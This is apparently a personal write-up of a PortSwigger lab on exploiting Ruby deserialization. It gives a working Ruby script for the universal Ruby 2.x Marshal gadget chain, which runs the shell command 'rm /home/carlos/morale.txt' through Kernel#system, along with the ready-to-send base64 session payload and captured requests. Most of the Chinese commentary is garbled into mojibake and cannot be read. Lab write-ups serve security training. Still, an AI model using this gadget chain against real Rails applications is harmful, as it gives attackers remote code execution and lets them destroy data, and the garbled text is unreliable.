---
layout: post
title: "Exploiting Ruby deserialization using a documented gadget chain"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---






# Exploiting Ruby deserialization using a documented gadget chain


æ•™å­¸:
http://m.bubuko.com/infodetail-3734787.html

Ruby2.X è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æä¹‹ååºåˆ—åŒ–gadgeté“¾
https://www.anquanke.com/post/id/163962


```

This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

#### Hint

Try searching for "ruby [deserialization](https://portswigger.net/web-security/deserialization) gadget chain" online.



æœ¬å¯¦é©—ä½¿ç”¨åŸºæ–¼åºåˆ—åŒ–çš„æœƒè©±æ©Ÿåˆ¶å’Œ Ruby on Rails æ¡†æ¶ã€‚ æœ‰è¨˜éŒ„çš„æ¼æ´åˆ©ç”¨å¯ä»¥é€šéè©²æ¡†æ¶ä¸­çš„å°å·¥å…·éˆå¯¦ç¾é ç¨‹ä»£ç¢¼åŸ·è¡Œã€‚

è¦è§£æ±ºå¯¦é©—å®¤å•é¡Œï¼Œè«‹æ‰¾åˆ°ä¸€å€‹è¨˜éŒ„åœ¨æ¡ˆçš„æ¼æ´åˆ©ç”¨ä¸¦å°å…¶é€²è¡Œèª¿æ•´ï¼Œä»¥å‰µå»ºä¸€å€‹åŒ…å«é ç¨‹ä»£ç¢¼åŸ·è¡Œè² è¼‰çš„æƒ¡æ„åºåˆ—åŒ–å°è±¡ã€‚ ç„¶å¾Œï¼Œå°‡æ­¤å°åƒå‚³éåˆ°ç¶²ç«™ä»¥å¾ Carlos çš„ä¸»ç›®éŒ„ä¸­åˆªé™¤morale.txt æ–‡ä»¶ã€‚
æš—ç¤º

å˜—è©¦åœ¨ç·šæœç´¢â€œruby ååºåˆ—åŒ–å°å·¥å…·éˆâ€ã€‚




```

wiener:peter


login -> update emial -> æŠ“åŒ…
```http

POST /my-account/change-email HTTP/1.1
Host: 0aec000903081d7ec0cc06eb00bd004b.web-security-academy.net
Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVlM2dlZTVtM3V2YW1qa3k5dWp0bnhnNjZ4MjhtN3Q5eQY7B0YK
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0aec000903081d7ec0cc06eb00bd004b.web-security-academy.net
Referer: https://0aec000903081d7ec0cc06eb00bd004b.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333

```

ä¸çŸ¥é“æ˜¯å•¥èªè¨€çš„åºåˆ—åŒ–
```

o:	User:@usernameI"wiener:EF:@access_tokenI"%e3gee5m3uvamjky9ujtnxg66x28m7t9y;F


```


cookieäº‚æ”¹123:
```http

POST /my-account/change-email HTTP/1.1
Host: 0a2700b1040a4c5dc04e1cf800c3008f.web-security-academy.net
Cookie: session=123
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a2700b1040a4c5dc04e1cf800c3008f.web-security-academy.net
Referer: https://0a2700b1040a4c5dc04e1cf800c3008f.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333

```


å ±éŒ¯rubyèªè¨€
```
index.rb:13:in `load&apos;: incompatible marshal file format (can&apos;t be read) (TypeError)
	format version 4.8 required; 63.109 given
	from -e:13:in `&lt;main&gt;&apos;
```

æ‹¿å»googleæŸ¥åˆ°2.xç‰ˆæœ¬çš„å ±éŒ¯
https://github.com/rubygems/rubygems/issues/1589







## RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN

A universal gadget chain to achieve arbitrary code execution in Ruby 2.x
https://www.elttam.com/blog/ruby-deserialization/

é€™é‚Šæˆ‘è¸©äº†ä¸€å€‹å‘ï¼ŒåŸå› æœªçŸ¥ï¼Œæœ‰äº›æ•™å­¸çš„æ–¹æ³•ï¼Œæˆ‘æ‹¿åˆ°çš„payload è·Ÿå®ƒä¸€æ¨£ï¼Œä½†æˆ‘passä¸äº†ã€‚

æˆ‘æ˜¯çœ‹äº†é€™å½±ç‰‡æ‰æˆåŠŸçš„ã€‚
https://www.youtube.com/watch?v=phGuYUM7BMw
payload è·Ÿå…¶å®ƒæ•™å­¸çš„ä¸ä¸€æ¨£ã€‚

æ”¹ä¸€ä¸‹å‘½ä»¤:
rm /home/carlos/morale.txt

```ruby
#! /usr/bin/ruby

require 'base64'


Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
#puts payload.inspect
#puts Marshal.load(payload)

puts Base64.encode64(payload)

```


é€™è£¡æœ‰æ›è¡Œå­—å…ƒæ‰€ä»¥è¦å¹«å®ƒç˜¦èº«ã€‚
```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

```

å¯ä»¥ç”¨è€æ–¹æ³•ï¼Œä½†æœ€å¿«çš„æ–¹æ³•å°±æ˜¯ç›´æ¥æ‹¿å»google ä¸Šé¢ï¼Œç„¶å¾Œå®ƒæœƒtrim æ‰ç©ºæ ¼åœ¨è¤‡è£½
firefox ä¸è¡Œ

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

```

é—œæ–¼è¦ä¸è¦url encode å…¶å¯¦ä¸ç”¨ï¼Œå› ç‚ºurl æ˜¯æ²’æœ‰æ›è¡Œçš„ æ‰€ä»¥å®ƒä¹Ÿæ˜¯encode æŠŠæ›è¡Œæ‹¿æ‰ã€‚


ä½ ç›´æ¥æäº¤é€™å€‹å°±å¯ä»¥æˆåŠŸäº†ã€‚


